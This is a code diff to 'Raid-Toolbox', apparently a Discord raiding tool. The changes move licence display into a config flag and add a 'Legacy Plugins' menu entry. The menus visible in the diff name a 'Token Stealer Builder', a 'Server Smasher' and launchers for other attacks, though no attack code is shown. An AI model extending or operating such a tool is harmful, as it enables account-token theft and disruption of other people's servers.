@@ -42,6 +42,7 @@ try:
         combine_uverified_and_verified = config['combine_uverified_and_verified']
         server_smasher_in_main_window = config['server_smasher_in_main_window']
         ignore_ffmpeg_missing = config['ignore_ffmpeg_missing']
+        show_licence = config['show_licence']
 except Exception:
     print("Unable to read config file.\nImporting necessary modules and checking installation...")
     import os
@@ -85,6 +86,7 @@ except Exception:
             combine_uverified_and_verified = config['combine_uverified_and_verified']
             server_smasher_in_main_window = config['server_smasher_in_main_window']
             ignore_ffmpeg_missing = config['ignore_ffmpeg_missing']
+            show_licence = config['show_licence']
     except Exception:
         print("Unable to start.")
         input()
@@ -580,7 +582,7 @@ else:
                         shutil.rmtree("ffmpeg-4.1.3-win64-static")
 
 # Display Licence
-if not os.path.isfile("RTBFiles/licence"):
+if not show_licence == 0:
     lic = requests.get("https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/LICENCE").text
     if command_line_mode == 1:
         print("Raid-Toolbox\n"+lic)
@@ -589,10 +591,14 @@ if not os.path.isfile("RTBFiles/licence"):
     else:
         sg.Popup(lic, button_type=None, no_titlebar=True, title="LICENCE", keep_on_top=True, grab_anywhere=True)
     try:
-        with open("RTBFiles/licence","w+",errors='ignore') as handle:
-            handle.write(lic)
-    except Exception:
-        pass
+        with open('config.json', 'r+') as handle:
+            edit = json.load(handle)
+            edit['show_licence'] = 0
+            handle.seek(0)
+            json.dump(edit, handle, indent=4)
+            handle.truncate()
+    except Exception as e:
+        print(e)
 
 
 # CloudFlare Checks
@@ -744,11 +750,11 @@ def main(currentattacks):
         print(colored("25. Token options",menu2))
         choice = input(colored(">",menu2))
     elif command_line_mode == 0:
-        menu_def = [['RTB', ['Attack Manager', 'Themes',['Change Theme', 'Theme Repo', 'Theme Creator'], 'About', ['Info', 'Diagnostics', 'Updater', 'Settings']]],
+        menu_def = [['RTB', ['Attack Manager', 'Themes',['Change Theme', 'Theme Repo'], 'About', ['Info', 'Diagnostics', 'Updater', 'Settings']]],
                     ['Tokens', ['View/Add Tokens', 'Token Stealer Builder', 'Token Toolkit']],
                     ['Help', ['Wiki', 'My YouTube', 'Discord Server', 'Telegram']],
                     ['Server Smasher', ['Launch']],
-                    ['Plugins', ['Plugin Support Coming soon. (Use Command Line to access Legacy Plugins)']]
+                    ['Plugins', ['Legacy Plugins']]
                     ]
         layout =[
                 [sg.Menu(menu_def)],
@@ -1277,6 +1283,9 @@ def main(currentattacks):
             elif event == "Reaction Adder":
                 p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','reaction',sys.executable,str(command_line_mode),str(thread_count),str(attacks_theme)],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
                 currentattacks["Reaction | Started at: {}".format(datetime.datetime.now().time())] = p.pid
+            elif event == "Legacy Plugins":
+                window.Close()
+                customplugins(currentattacks)
     else:
         now = datetime.datetime.now()
         if len(str(tcounter)) == 1:
